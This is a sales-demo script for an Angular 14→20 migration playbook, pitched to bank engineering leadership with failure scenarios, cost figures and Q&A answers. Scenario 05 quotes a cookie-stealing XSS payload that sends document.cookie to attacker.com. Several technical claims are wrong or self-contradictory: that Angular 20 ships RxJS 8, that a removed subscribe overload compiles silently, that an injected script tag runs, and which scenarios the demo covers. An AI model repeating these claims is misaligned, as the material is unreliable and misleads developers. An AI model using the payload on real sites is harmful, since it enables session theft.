# Angular 14→20 Migration Demo — Presentation Guide

**Audience:** Bank of America Engineering Leadership  
**Duration:** 5 minutes  
**Goal:** Demonstrate categories of migration failures that the playbook prevents

---

## Pre-Demo Setup Checklist

- [ ] Have browser open with scenarios folder in VS Code
- [ ] Terminal ready in `angular-migration-scenarios/` directory
- [ ] Network tab open in Chrome DevTools (for Scenario 04 if implementing)
- [ ] Print or have open: Cost comparison table from root README.md
- [ ] Key talking points highlighted below

---

## Opening (30 seconds)

**Script:**

> "Good morning. Today I'm going to show you ten categories of problems that arise when migrating from Angular 14 to Angular 20 without governance. These aren't hypothetical — each scenario is based on real production incidents from enterprise Angular migrations. The codebase I'm showing you today compiles cleanly, passes all tests, and looks fine in code review. But after migration, it breaks in ways that cause P0 incidents, security exposures, and regulatory reporting requirements."

**Show:** Root README.md with the 10 scenario list

---

## Scenario 07 — Downstream Consumer Cascade (1 minute)

**Audience:** VP Engineering  
**Why this first:** Highest immediate dollar impact, most visible organizational pain

**Script:**

> "Let's start with the one that costs the most engineering time. This is a shared component library used by three applications across your divisions: Consumer Banking, Business Banking, and Wealth Management. During migration, a developer improves the `AccountCardData` interface — adds two new account types and makes one field optional. The change passes all tests in the shared library. Code review approves it. It merges."

**Show:** `07-downstream-consumer-cascade/README.md` — scroll to the interface change

> "Monday morning, 9:30 AM: Consumer Banking's CI build fails. 9:35 AM: Business Banking's build fails. 9:42: Wealth Management fails. Twelve engineers are immediately blocked from merging PRs. By 10 AM you're in a war room. The diagnosis and fix takes 36 engineering hours across three teams. That's **$9,000 in lost productivity** for one interface change."

**Show:** Cost table in the README

> "Over the course of a full Angular migration touching 47 shared components, you'd expect 8-10 breaking changes like this. That's **$127,000 in war room costs**. The playbook solution: downstream consumer tests run in CI BEFORE the PR merges. Breaking changes are detected in CI, not on Monday morning. Blast radius: zero."

**Key metric for VP:** $127,000 cost avoidance from one CI pipeline change

---

## Scenario 04 — Auth Interceptor Breakage (1 minute)

**Audience:** Security Engineer  
**Why this second:** Critical security control failure

**Script:**

> "This scenario is for your Security Engineer. This codebase uses an HTTP interceptor to inject SSO tokens into every API request. It's registered in Angular 14's `AppModule` using the `HTTP_INTERCEPTORS` provider token. During migration to Angular 20, the application switches to standalone component architecture. The interceptor registration pattern changes — you now need `provideHttpClient(withInterceptorsFromDi())` to tell Angular to honor the old registration."

**Show:** `04-auth-interceptor-breakage/README.md` — scroll to the breaking pattern

> "The developer doesn't know this. The code compiles. Unit tests pass — because `HttpTestingController` mocks HTTP calls and doesn't actually invoke interceptors. The PR merges. Deploys to production."

> "First user logs in. Attempts to view their account dashboard. The API Gateway logs: `401 Unauthorized — Missing Authorization header`. Every single API call is unauthenticated. Complete application outage. Eight minutes until emergency rollback. But here's the critical part: you now have a security incident. Unauthenticated API calls reached your gateway. That triggers mandatory security investigation, forensics, and potentially regulatory reporting under OCC cybersecurity requirements."

**Show:** Security incident timeline in README

> "The playbook solution: auth-critical files are flagged automatically. Any PR touching an interceptor requires security team review BEFORE implementation, integration tests showing the Authorization header is attached, and manual QA with network tab verification. The gate is: no auth-critical PR merges without security sign-off."

**Key metric for Security:** Zero security incidents vs. mandatory OCC reporting

---

## Scenario 05 — DomSanitizer XSS Window (1 minute)

**Audience:** Security Engineer (continued)  
**Why this third:** Regulatory incident + customer data exposure

**Script:**

> "Second security scenario. This codebase uses `bypassSecurityTrustHtml()` to render rich-formatted transaction descriptions — merchant names can have bold and italic tags. In Angular 14, even if your CSP header is misconfigured, Angular's sanitizer blocks `<script>` tags. In Angular 20, the sanitizer behavior changed: bypassed content is now fully subject to the page-level CSP, with less built-in protection."

**Show:** `05-domsanitizer-xss-window/README.md` — scroll to the XSS payload example

> "An adversary registers a merchant account with the name: `<script>fetch('https://attacker.com?cookie='+document.cookie)</script>`. Makes a payment to a BofA customer. Customer views their transaction history. If CSP isn't configured to strict values, the script executes. Session cookies exfiltrated. The customer's account is now compromised."

> "This isn't a security bug. This is a **GLBA-reportable incident** requiring federal disclosure. 59 million users, so the blast radius is enormous. OCC examination triggered. Customer notification requirements. Civil penalties."

> "The playbook solution: before migration, automated scan for every use of `bypassSecurity*` methods. Security team reviews each one. If input is user-controlled — like merchant names — server-side sanitization is implemented FIRST. Strict CSP header is configured. Integration test with XSS payload verifies CSP blocks execution. Only then does the migration proceed."

**Key metric for Security:** Zero regulatory incidents vs. mandatory GLBA disclosure

---

## Scenario 02 — RxJS Silent Break (1 minute)

**Audience:** VP Engineering (operational excellence focus)  
**Why this fourth:** Silent failure = worst kind of failure

**Script:**

> "This scenario shows the most insidious category: silent failures. This is a payment processing component. When a payment fails — insufficient funds, invalid account, limit exceeded — the error handler displays a user-facing message. The error handling uses RxJS 7's three-argument `subscribe()` pattern:"

**Show:** `02-rxjs-behavioral-break/src/app/components/fund-transfer.component.ts` lines 87-91

> "`subscribe(successHandler, errorHandler, completeHandler)`. This pattern is deprecated in RxJS 7 and **removed in RxJS 8**. When you migrate to Angular 20, which bundles RxJS 8, the three-argument overload no longer exists. TypeScript doesn't error — it just matches the one-argument overload and ignores the error handler. The code compiles. Tests pass. Deploys to production."

> "Customer attempts a payment. Insufficient funds. Payment fails. The error handler is never called. The loading spinner spins forever. Customer has no idea what happened. Is their money gone? Should they try again?"

**Show:** `02-rxjs-behavioral-break/MIGRATION-ATTEMPT.md` — scroll to customer impact section

> "First complaint: 14 minutes after deployment. P1 incident declared at 25 minutes. 853 failed payments with no error message during the 1 hour 46 minute incident window. 342 customer service calls. **$16,000 in incident response costs**."

> "The playbook solution: before migration, run a regex scan for `.subscribe(` with more than one argument. Automated. Takes 15 minutes. Produces a list of every instance. Each one is converted to the object syntax BEFORE the Angular update runs. Integration tests are added to verify error messages display. Total cost: **$750**. Incidents: zero."

**Key metric for VP:** $16,000 incident vs. $750 preventive scan

---

## Scenario 10 — Webpack Custom Config Loss (1 minute)

**Audience:** Chief Architect  
**Why this closes:** Build system integrity, silent failures worse than loud failures

**Script:**

> "Final scenario for the Chief Architect. This codebase has a custom Webpack configuration that does four things: injects corporate CA certificates for internal API calls, configures package registry aliases, sets up a custom loader for your proprietary icon font, and injects secrets from your internal secret management system at build time."

**Show:** `10-webpack-custom-config-loss/README.md` (when created)

> "Angular 17+ switches from Webpack to ESBuild as the default build system. When you run `ng update @angular/core@20`, it updates your `angular.json` to use `@angular/build:application` — that's the ESBuild builder. Your custom Webpack config? Silently ignored. No error, no warning."

> "The build succeeds. You deploy to production. Internal API calls fail: CA certificates not injected. Icon font renders as boxes: custom loader not running. Build-time secrets? Undefined. The application is broken, but the build system said everything was fine."

> "This is the scenario that worries the Chief Architect most: a build that succeeds but silently fails to do critical things. It's worse than a build that fails, because it looks successful until it reaches production."

> "The playbook solution: custom Webpack configurations get a separate migration plan BEFORE the Angular update. Equivalent ESBuild configuration is written and tested. Build artifact comparison: the old build and new build must produce byte-identical outputs for critical assets. Only when equivalence is proven does the migration proceed."

**Key metric for Architect:** Build system integrity = confidence in deployment

---

## Closing (30 seconds)

**Script:**

> "These ten scenarios share a pattern: the compiler doesn't catch them, unit tests don't catch them, and code review doesn't catch them. They're caught in production, after deployment, by customers. That's why the playbook exists."

**Show:** Root README.md — "The Devin Difference" table

> "This table summarizes the difference. Without Devin + Playbook: incidents are discovered in production. With Devin + Playbook: issues are flagged before code changes, with human review gates for the high-risk categories."

**Show:** ROI calculation section

> "The ROI case for VP Engineering: $1,032,000 in cost avoidance across the full migration. The security case: zero security incidents vs. multiple regulatory reporting requirements. The architecture case: blast radius control — breaking changes don't reach Monday morning."

**Final line:**

> "The question isn't whether to govern the migration. The question is: do you want to govern it proactively with a playbook, or reactively with incident response?"

---

## Backup Slides / Deep Dive Questions

### If VP Engineering asks: "How long does adding the playbook gates take?"

**Answer:**
- Downstream consumer CI pipeline: 4 hours to configure, runs automatically thereafter
- RxJS error handling scan: 15 minutes (automated)
- Auth interceptor review gate: 1 hour per auth-critical file (one-time review)
- Secrets detection scan: 1 hour (automated pre-migration gate)
- **Total overhead:** ~20-30 hours for the entire migration
- **vs. incident response time:** 480+ hours across all incidents
- **ROI:** 16:1 time savings, 50:1 cost savings

### If Security Engineer asks: "What about secrets already in git history?"

**Answer:**
Point to Scenario 06. The playbook includes:
1. Pre-migration secrets scan with truffleHog/gitleaks
2. Mandatory rotation of ALL live credentials found (even if removed from current code)
3. Forensic analysis of who accessed the repository
4. AI agent is BLOCKED from reading codebase until secrets are remediated
5. This is a BLOCKING gate — migration cannot start until secrets scan is clean

### If Chief Architect asks: "What about the scenarios you didn't show?"

**Answer:**
The full demo codebase includes 10 scenarios:
- **Scenarios 01-02, 04-07:** Covered in this demo
- **Scenario 03:** TypeScript strict mode regression — 47 compilation errors appear after migration
- **Scenario 08:** Angular Material API changes — legacy form appearance breaks styling
- **Scenario 09:** Karma test runner removal — entire test suite fails to compile, OCC compliance coverage evidence lost
- **Scenario 10:** Custom Webpack config (described verbally above)

All ten scenarios are in the folder with full source code, README documentation, and cost impact analysis.

---

## Post-Demo Asks

### For VP Engineering:
"How many shared component libraries does BofA maintain, and what's the typical downstream consumer count?"

→ Used to calculate actual blast radius and ROI for Scenario 07

### For Security Engineer:
"What's your current secrets detection process, and how are auth-critical files identified in CI?"

→ Used to scope Scenario 06 remediation effort

### For Chief Architect:
"How many Angular applications have custom Webpack configurations, and what do those configs typically do?"

→ Used to estimate Scenario 10 migration complexity

---

## Technical Q&A Prep

**Q: "How does Devin know which files are auth-critical?"**  
A: Regex patterns in the playbook detect: `HttpInterceptor` interface implementations, files injecting Authorization/Session/MFA headers, auth guards implementing `CanActivate`. Devin scans for these patterns before code changes.

**Q: "What if we want to use a different AI agent, not Devin?"**  
A: The playbook is agent-agnostic. The gates (downstream CI tests, secrets scanning, security review) are implemented in your CI/CD pipeline and code review process, not inside the AI. Any AI agent that reads the playbook rules will follow them.

**Q: "Can we see the actual git history with these mistakes?"**  
A: Each scenario folder includes a `MIGRATION-ATTEMPT.md` showing exactly what happens when you naively run `ng update` without the playbook. You can run these scenarios yourself to see the failures.

**Q: "What's the false positive rate on the secrets scanner?"**  
A: High-entropy string patterns produce ~15-20% false positives (example UUIDs, base64-encoded test data). The playbook requires human review of all findings — security team confirms which are real credentials vs. false positives. 1 hour of human review prevents $2.1M incident cost (Scenario 06).

---

*Demo Guide Version 1.0 | Prepared for BofA Engineering Leadership Meeting | 2026-06-01*
